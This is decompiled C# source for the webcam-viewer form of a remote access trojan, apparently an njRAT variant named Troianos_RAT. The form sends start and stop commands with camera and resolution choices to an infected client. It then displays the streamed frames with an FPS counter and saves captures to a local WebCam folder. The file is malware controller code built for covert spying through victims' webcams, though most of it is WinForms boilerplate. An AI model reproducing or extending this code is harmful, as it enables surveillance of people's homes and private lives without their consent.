using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x0200000B RID: 11
	[DesignerGenerated]
	public partial class Cam : Form
	{
		// Token: 0x060000A6 RID: 166 RVA: 0x001DE770 File Offset: 0x001DCB70
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Cam.__ENCList;
			lock (_ENCList)
			{
				bool flag = Cam.__ENCList.Count == Cam.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Cam.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Cam.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Cam.__ENCList[num] = Cam.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Cam.__ENCList.RemoveRange(num, Cam.__ENCList.Count - num);
					Cam.__ENCList.Capacity = Cam.__ENCList.Count;
				}
				Cam.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x060000A9 RID: 169 RVA: 0x001DEEFC File Offset: 0x001DD2FC
		// (set) Token: 0x060000AA RID: 170 RVA: 0x001DEF14 File Offset: 0x001DD314
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x1700003C RID: 60
		// (get) Token: 0x060000AB RID: 171 RVA: 0x001DEF20 File Offset: 0x001DD320
		// (set) Token: 0x060000AC RID: 172 RVA: 0x001DEF38 File Offset: 0x001DD338
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ComboBox1_SelectedIndexChanged);
				bool flag = this._ComboBox1 != null;
				if (flag)
				{
					this._ComboBox1.SelectedIndexChanged -= value2;
				}
				this._ComboBox1 = value;
				flag = (this._ComboBox1 != null);
				if (flag)
				{
					this._ComboBox1.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x060000AD RID: 173 RVA: 0x001DEF98 File Offset: 0x001DD398
		// (set) Token: 0x060000AE RID: 174 RVA: 0x001DEFB0 File Offset: 0x001DD3B0
		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox3_CheckedChanged);
				bool flag = this._CheckBox3 != null;
				if (flag)
				{
					this._CheckBox3.CheckedChanged -= value2;
				}
				this._CheckBox3 = value;
				flag = (this._CheckBox3 != null);
				if (flag)
				{
					this._CheckBox3.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x060000AF RID: 175 RVA: 0x001DF010 File Offset: 0x001DD410
		// (set) Token: 0x060000B0 RID: 176 RVA: 0x001DF028 File Offset: 0x001DD428
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x060000B1 RID: 177 RVA: 0x001DF088 File Offset: 0x001DD488
		// (set) Token: 0x060000B2 RID: 178 RVA: 0x001DF0A0 File Offset: 0x001DD4A0
		internal virtual ComboBox ComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ComboBox2_SelectedIndexChanged);
				bool flag = this._ComboBox2 != null;
				if (flag)
				{
					this._ComboBox2.SelectedIndexChanged -= value2;
				}
				this._ComboBox2 = value;
				flag = (this._ComboBox2 != null);
				if (flag)
				{
					this._ComboBox2.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x060000B3 RID: 179 RVA: 0x001DF100 File Offset: 0x001DD500
		// (set) Token: 0x060000B4 RID: 180 RVA: 0x001DF118 File Offset: 0x001DD518
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.PictureBox1_Paint);
				bool flag = this._PictureBox1 != null;
				if (flag)
				{
					this._PictureBox1.Paint -= value2;
				}
				this._PictureBox1 = value;
				flag = (this._PictureBox1 != null);
				if (flag)
				{
					this._PictureBox1.Paint += value2;
				}
			}
		}

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x060000B5 RID: 181 RVA: 0x001DF178 File Offset: 0x001DD578
		// (set) Token: 0x060000B6 RID: 182 RVA: 0x001DF190 File Offset: 0x001DD590
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x060000B7 RID: 183 RVA: 0x001DF19C File Offset: 0x001DD59C
		// (set) Token: 0x060000B8 RID: 184 RVA: 0x001DF1B4 File Offset: 0x001DD5B4
		internal virtual Timer vmethod_6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._vmethod_6 != null;
				if (flag)
				{
					this._vmethod_6.Tick -= value2;
				}
				this._vmethod_6 = value;
				flag = (this._vmethod_6 != null);
				if (flag)
				{
					this._vmethod_6.Tick += value2;
				}
			}
		}

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060000B9 RID: 185 RVA: 0x001DF214 File Offset: 0x001DD614
		// (set) Token: 0x060000BA RID: 186 RVA: 0x001DF22C File Offset: 0x001DD62C
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick_1);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		// Token: 0x060000BB RID: 187 RVA: 0x001DF28C File Offset: 0x001DD68C
		public Cam()
		{
			base.FormClosing += this.Cam_FormClosing;
			base.Load += this.Cam_Load;
			Cam.__ENCAddToList(this);
			this.fps = 0;
			this.int_0 = 0;
			this.QQ = string.Empty;
			this.folder = string.Empty;
			this.InitializeComponent();
		}

		// Token: 0x060000BC RID: 188 RVA: 0x001DF2FC File Offset: 0x001DD6FC
		private void Cam_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				bool cn = this.sk.CN;
				if (cn)
				{
					this.sk.Send("@");
				}
				this.sk.CN = false;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000BD RID: 189 RVA: 0x001DF35C File Offset: 0x001DD75C
		private void Cam_Load(object sender, EventArgs e)
		{
			try
			{
				this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.osk.L)));
				this.Text = this.QQ;
				this.ComboBox2.SelectedIndex = 3;
				this.vmethod_6.Enabled = true;
				this.folder = this.osk.Folder + "WebCam\\";
				bool flag = !Directory.Exists(this.folder);
				if (flag)
				{
					Directory.CreateDirectory(this.folder);
				}
				try
				{
					this.ComboBox2.SelectedIndex = Class7.class8_0.int_0;
				}
				catch (Exception ex)
				{
					this.ComboBox2.SelectedIndex = 3;
				}
				flag = Class7.class8_0.bool_7;
				if (flag)
				{
					this.Button1.Text = "Parar";
					this.sk.Send(string.Concat(new string[]
					{
						"!",
						Class7.string_1,
						Conversions.ToString(this.ComboBox1.SelectedIndex),
						Class7.string_1,
						this.ComboBox2.Text
					}));
				}
			}
			catch (Exception ex2)
			{
				this.Close();
			}
		}

		// Token: 0x060000BE RID: 190 RVA: 0x001DF4FC File Offset: 0x001DD8FC
		private void Timer1_Tick(object sender, EventArgs e)
		{
			this.vmethod_6.Enabled = false;
			bool flag;
			try
			{
				flag = (this.osk == null | this.sk == null);
				if (flag)
				{
					this.Close();
					return;
				}
				flag = (!this.osk.CN | !this.sk.CN);
				if (flag)
				{
					this.Close();
				}
			}
			catch (Exception ex)
			{
			}
			this.int_0 = this.fps;
			flag = (this.int_0 == 0);
			if (flag)
			{
				this.pkt = 0;
				this.PictureBox1.Invalidate();
			}
			this.fps = 0;
			this.vmethod_6.Enabled = true;
		}

		// Token: 0x060000BF RID: 191 RVA: 0x001DF5C8 File Offset: 0x001DD9C8
		private void PictureBox1_Paint(object sender, PaintEventArgs e)
		{
			try
			{
				string text = Conversions.ToString(this.int_0) + " FPS\r\n" + Class6.smethod_17((long)this.pkt);
				Size size = TextRenderer.MeasureText(text, new Font(this.Font, FontStyle.Bold));
				Rectangle rect = new Rectangle(0, 0, size.Width, size.Height);
				e.Graphics.FillRectangle(Brushes.Black, rect);
				Brush brush = Brushes.White;
				bool flag = this.int_0 > 3;
				if (flag)
				{
					brush = Brushes.YellowGreen;
				}
				flag = (this.int_0 > 6);
				if (flag)
				{
					brush = Brushes.White;
				}
				e.Graphics.DrawString(text, new Font(this.Font, FontStyle.Bold), brush, 0f, 0f);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x001DF6B0 File Offset: 0x001DDAB0
		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = Operators.CompareString(this.Button1.Text, "Iniciar", false) == 0;
				if (flag)
				{
					this.Button1.Text = "Parar";
					this.sk.Send(string.Concat(new string[]
					{
						"!",
						Class7.string_1,
						Conversions.ToString(this.ComboBox1.SelectedIndex),
						Class7.string_1,
						this.ComboBox2.Text
					}));
				}
				else
				{
					this.Button1.Text = "Iniciar";
					this.sk.Send("@");
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x001DF790 File Offset: 0x001DDB90
		private void CheckBox3_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox3.Checked;
			if (@checked)
			{
				try
				{
					Process.Start(this.folder);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x001DF7E0 File Offset: 0x001DDBE0
		private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Parar", false) == 0;
			if (flag)
			{
				NewLateBinding.LateCall(this.sk, null, "Send", new object[]
				{
					RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(this.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(this.ComboBox2.SelectedItem)))
				}, null, null, null, true);
			}
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x001DF870 File Offset: 0x001DDC70
		private void ComboBox2_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Parar", false) == 0;
			if (flag)
			{
				NewLateBinding.LateCall(this.sk, null, "Send", new object[]
				{
					RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(this.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(this.ComboBox2.SelectedItem)))
				}, null, null, null, true);
			}
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x001DF900 File Offset: 0x001DDD00
		private void Timer1_Tick_1(object sender, EventArgs e)
		{
			this.ProgressBar1.Value = this.sk.rp();
		}

		// Token: 0x04000050 RID: 80
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000052 RID: 82
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x04000053 RID: 83
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x04000054 RID: 84
		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		// Token: 0x04000055 RID: 85
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000056 RID: 86
		[AccessedThroughProperty("ComboBox2")]
		private ComboBox _ComboBox2;

		// Token: 0x04000057 RID: 87
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x04000058 RID: 88
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x04000059 RID: 89
		[AccessedThroughProperty("vmethod_6")]
		private Timer _vmethod_6;

		// Token: 0x0400005A RID: 90
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x0400005B RID: 91
		public string folder;

		// Token: 0x0400005C RID: 92
		public int fps;

		// Token: 0x0400005D RID: 93
		private int int_0;

		// Token: 0x0400005E RID: 94
		public Client osk;

		// Token: 0x0400005F RID: 95
		public int pkt;

		// Token: 0x04000060 RID: 96
		public string QQ;

		// Token: 0x04000061 RID: 97
		public Client sk;
	}
}
